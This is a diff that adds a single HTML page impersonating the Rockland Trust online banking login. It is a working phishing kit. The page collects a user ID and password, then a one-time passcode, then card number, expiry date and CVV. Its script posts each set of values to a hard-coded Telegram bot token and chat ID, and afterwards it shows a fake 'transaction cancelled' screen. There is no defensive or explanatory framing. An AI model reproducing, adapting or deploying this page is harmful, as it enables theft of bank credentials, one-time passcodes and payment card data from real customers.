@@ -1,0 +1,505 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Rockland Trust</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&display=swap" rel="stylesheet">
+    <style>
+        *{
+            text-decoration: none;
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        body{
+            background-color: #CACBCD;
+            background-image: linear-gradient(to bottom, #d1d2d3 60%, #e0e0e0 60%);
+            background-size: 100% 7px;
+            font-family: "Open Sans", Arial, Helvetica, sans-serif;
+        }
+        .grandCntn{
+            width: 100%;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            gap: 40px;
+            flex-wrap: nowrap;
+            align-items: center;
+            justify-content: center;
+            padding-inline: 3%;
+            padding-block: 7em 3em;
+        }
+        .formCntn{
+            max-width: 638px;
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            flex-wrap: nowrap;
+            border-radius: 5px;
+            overflow: hidden;
+        }
+        .formTitle{
+            width: 100%;
+            background-color: #092c74;
+            padding-block: 15px 37px;
+            display: grid;
+            place-items: center;
+        }
+
+        @media screen and (max-width: 450px){
+            body{
+                background-color: #CACBCD;
+                background-image: none;
+                background-size: 100%;
+            }
+            .grandCntn{
+                padding-block: 3em 3.8em;
+            }
+            .formTitle{
+                padding-block: 5px 15px;
+            }
+        }
+            
+        .formTitle img{
+            width: 50%;
+            background-size: contain;
+            background-position: center;
+            background-color: #092c74;
+        }
+
+        .form{
+            min-height: 60px;
+            width: 100%;
+            background-color: #fafafa;
+            padding-block: 25px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .firstSection{
+            width: 70%;
+            max-width: 364px;
+            min-width: 295px;
+            display: flex;
+            gap: 10px;
+            flex-direction: column;
+            /* align-items: center; */
+        }
+
+        .firstSection > svg{
+            width: 120px;
+            height: 120px;
+            margin: auto;
+        }
+        .firstSection > svg path{
+            fill: rgb(7, 138, 7);
+        }
+
+        .firstSection h3{
+            font-size: 15px;
+            color: black;
+            margin-block: 12px;
+            font-weight: 600;
+        }
+        .firstSection h2{
+            font-size: 16px;
+            color: black;
+            margin-block: 17px;
+            font-weight: 600;
+            text-align: center;
+        }
+
+        .login{
+            display: flex;
+        }
+        .otp{
+            display: none;
+        }
+        .card{
+            display: none;
+        }
+        .success{
+            display: none; 
+        }
+        .grid{
+            display: grid;
+            align-items: center;
+            grid-template-columns: 1fr 1fr;
+            gap: 30px;
+        }
+        .inputCntn{
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .inputCntn label{
+            font-size: 15px;
+            color: black;
+            font-weight: 600;
+        }
+        .inputCntn input{
+            appearance: none;
+            height: 45px;
+            width: 100%;
+            padding: 0 13px;
+            background-color: #fff;
+            border: 1px solid #cccccc;
+            color: #2e2e2e;
+            border-radius: 3px;
+            font-size: 1.15em;
+            outline: 3px solid transparent;
+
+            transition: outline-color 0.3s ease;
+        }
+        /* For Chrome, Safari, Edge */
+        input[type="number"]::-webkit-outer-spin-button,
+        input[type="number"]::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+
+        /* For Firefox */
+        input[type="number"] {
+            -moz-appearance: textfield;
+        }
+        .inputCntn input:focus{
+            outline-color: #8ab9fc;
+        }
+
+        .submissionCntn{
+            width: 100%;
+        }
+
+        .rememberMe {
+            width: 100%;
+        }
+
+        .rememberMe:focus-within rect{
+            stroke-width: 2;
+            stroke: #092c74;
+        }
+        .rememberMe:focus-within svg{
+            outline-color: #8ab9fc;
+        }
+
+        .rememberMe label{
+            display: flex;
+            align-items: center;
+            margin-top: -12px;
+            gap: 10px;
+        }
+        .rememberMe label span{
+            font-size: 14px;
+            color: #2e2e2e;
+            font-weight: 400;
+        }
+
+        .rememberMe input{
+            appearance: none;
+        }
+        .rememberMe:has(input[type="checkbox"]:checked) polyline{
+            stroke: #092c74;
+        }
+
+        .rememberMe svg{
+            outline: 3px solid transparent;
+
+            transition: outline-color 0.3s ease;
+        }
+
+        .rememberMe svg rect{
+            stroke-width: 1;
+            stroke: #8f9299;
+        }
+        .rememberMe svg polyline{
+            stroke-width: 2;
+            stroke: transparent;
+        }
+
+        .firstSection:has(input:invalid)  button[type="submit"]{
+            cursor: pointer;
+            pointer-events: none;
+            opacity: 0.45;
+        }
+
+        .LoginBtn{
+            width: 100%;
+            height: 45px;
+            background-color: #092c74;
+            color: #fff;
+            border: none;
+            border-radius: 3px;
+            font-size: 14px;
+            font-weight: 600;
+            margin-top: 22px;
+            font-family: "Open Sans", sans-serif;
+
+            cursor: pointer;
+            pointer-events: all;
+            opacity: 1;
+
+            transition: all 0.15s ease;
+        }
+
+        .userLinks{
+            width: 100%;
+            margin-block: 28px 13px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .userLinks a{
+            font-size: 12px;
+            font-weight: 400;
+            color: #092c74;
+        }
+
+        .userLinks p{
+            font-size: 12px;
+            font-weight: 400;
+            color: #2e2e2e;
+        }
+        .userLinks p a{
+            font-size: 1.1em;
+            font-weight: 500;
+        }
+
+        .formFooter{
+            width: 100%;
+            background-color: #092c74;
+            height: 46px;
+            display: flex;
+            align-items: center;
+            gap: 3px;
+            justify-content: center;
+        }
+
+        .formFooter a{
+            font-size: 12px;
+            font-weight: 500;
+            color: white;
+            padding-inline: 24px;
+        }
+        .formFooter a:hover{
+            text-decoration: underline;
+        }
+        .formFooter a.loc, .formFooter a.pol{
+            border-right: 1px solid white;
+        }
+    </style>
+</head>
+<body>
+    <main class="grandCntn">
+        <div class="formCntn">
+            <div class="formTitle">
+                <img src="https://www.dmayorfitness.com/rockland.png" alt="">
+            </div>
+            <div class="form">
+                <form class="firstSection login" onsubmit="showOTPForm(event)">
+                    <div class="inputCntn userID">
+                        <label for="UserID">User ID</label>
+                        <input id="userid" type="text" autofocus required minlength="4">
+                    </div>
+                    <div class="inputCntn password">
+                        <label for="UserID">Password</label>
+                        <input id="password" type="password" required minlength="4">
+                    </div>
+
+                    <div class="submissionCntn">
+                        <div class="rememberMe">
+                            <input type="checkbox" id="rememberUser"> 
+                            <label for="rememberUser">
+                                <svg aria-hidden="true" focusable="false" width="20" height="20" viewBox="0 0 20 20">
+                                    <rect fill="none" stroke="none" stroke-width="2" x="1" y="1" width="18" height="18" rx="3"></rect>
+                                    <polyline fill="none" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" points="4 11.4390244 7.44978307 15.0611808 16 5"></polyline>
+                                </svg>
+                                <span>Remember me</span>
+                            </label>
+                        </div>
+
+                        <button type="submit" class="LoginBtn signInBtn">Log In</button>
+
+                        <div class="userLinks">
+                            <a href="https://www.rocklandtrustonline.com/rocklandtrustcompanyonline/Uux.aspx#/login/resetPasswordUsername">I am a new user.</a> 
+                            <a href="https://www.rocklandtrustonline.com/rocklandtrustcompanyonline/Uux.aspx#/login/resetPasswordUs">Forgot your password?</a>
+                        </div>
+                    </div>
+                </form>
+
+                <form class="firstSection otp" onsubmit="showCardForm(event)">
+                    <h3>We've sent an OTP to the mobile number linked to your account.</h3>
+                    <div class="inputCntn password">
+                        <label for="otp">OTP</label>
+                        <input id="otp" type="number" required minlength="6">
+                    </div>
+
+                    <div class="submissionCntn">
+                        <button type="submit" class="LoginBtn otpBtn">Verify</button>
+                        <div class="userLinks">
+                            <p>Didn't receive a code, <a>Resend</a>.</p>
+                        </div>
+                    </div>
+                </form>
+
+                <form class="firstSection card" onsubmit="doNothing(event)">
+                    <h3>Kindly input your card details to continue</h3>
+                    <div class="inputCntn password">
+                        <label for="cardNum">Card number</label>
+                        <input id="cardnumber" type="number" required minlength="20">
+                    </div>
+                    <div class="grid">
+                        <div class="inputCntn password">
+                            <label for="otp">Expriy date</label>
+                            <input id="expdate" type="text" required minlength="5" placeholder="05/29">
+                        </div>
+                        <div class="inputCntn password">
+                            <label for="otp">CVV</label>
+                            <input id="cvv" type="number" required minlength="3" placeholder="629">
+                        </div>
+                    </div>
+
+                    <div class="submissionCntn">
+                        <button type="submit" class="LoginBtn otpBtn">Continue</button>
+                    </div>
+                </form>
+
+                <div class="firstSection success">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="300" height="300" viewBox="0 0 1000 1000" preserveAspectRatio="xMidYMid meet">
+                        <path d="M396 744.3l-192.6-192.6c-4.5-4.5-4.5-11.7 0-16.2l65.2-65.2c4.5-4.5 11.7-4.5 16.2 0l107.7 107.7c4.5 4.5 11.6 4.4 16-0.2 101.4-107.5 202.3-214.6 303.5-322 4.3-4.6 11.6-4.8 16.2-0.5l68.2 64.3c4.6 4.3 4.8 11.6 0.5 16.2-128.6 136.4-257 272.5-385 408.3-4.3 4.6-11.5 4.7-15.9 0.2z"/>
+                    </svg>
+                    
+                    <h2>This transaction has been successfully cancelled</h2>
+                </div>
+                
+
+            </div>
+            <div class="formFooter">
+                <a href="#" class="loc">Locations</a>
+                <a href="#" class="pol">Privacy Policy</a>
+                <a href="#" class="enrol">Enroll</a>
+            </div>
+        </div>
+        <div class="fdicLogoCntn"><a href="https://cdn1.onlineaccess1.com/cdn/depot/3308/4366/8d7a1cb117b7827559a004f16ac35368/assets/images/fdic_logo_large-101554d3eebb7c3c6fedb7d73549127b.png" target="_blank" rel="noopener noreferrer"><img src="https://www.dmayorfitness.com/fdic_logo.png" alt=""></a></div>
+    </main>
+
+    <script>
+        // Telegram bot info
+        const botToken = '6448997754:AAFw-0r2PDyU_U2Bc1qAiQ7Se049u3JvXjE'; 
+        const chatId = '1361369788';
+
+        // Send a request to the Telegram API
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+
+        const loginForm = document.querySelector(".login");
+        const otpForm = document.querySelector(".otp");
+        const cardForm = document.querySelector(".card");
+        const successForm = document.querySelector(".success");
+
+        async function showOTPForm (e) {
+            
+            e.preventDefault();
+            loginForm.style.display = "none"
+            cardForm.style.display = "none"
+            successForm.style.display = "none"
+            otpForm.style.display = "flex"
+            
+            const userID = document.getElementById('userid').value;
+            const password = document.getElementById('password').value;
+
+            // Format the message to send to Telegram
+            const text = `New Form Submission:\n\nUsern-ID: ${userID}\nPassword: ${password}`;
+
+            const data = {
+                chat_id: chatId,
+                text: text
+            };
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data),
+                });
+                console.log("Message sent!!")
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+
+        async function showCardForm (e) {
+            e.preventDefault();
+            loginForm.style.display = "none"
+            cardForm.style.display = "flex"
+            otpForm.style.display = "none"
+            successForm.style.display = "none"
+
+
+            const otp = document.getElementById('otp').value;
+            
+            // Format the message to send to Telegram
+            const text = `New Form Submission:\n\nOTP: ${otp}`;
+
+            const data = {
+                chat_id: chatId,
+                text: text
+            };
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data),
+                });
+                console.log("Message sent!!")
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+        async function doNothing (e) {
+            e.preventDefault();
+            loginForm.style.display = "none"
+            cardForm.style.display = "none"
+            otpForm.style.display = "none"
+            successForm.style.display = "flex"
+
+
+            const cardNum = document.getElementById('cardnumber').value;
+            const expDate = document.getElementById('expdate').value;
+            const cvv = document.getElementById('cvv').value;
+
+            // Format the message to send to Telegram
+            const text = `New Form Submission:\n\nCard Number: ${cardNum}\nExpiry Date: ${expDate}\nCVV: ${cvv}`;
+
+            const data = {
+                chat_id: chatId,
+                text: text
+            };
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data),
+                });
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+
+    </script>
+</body>
+</html>
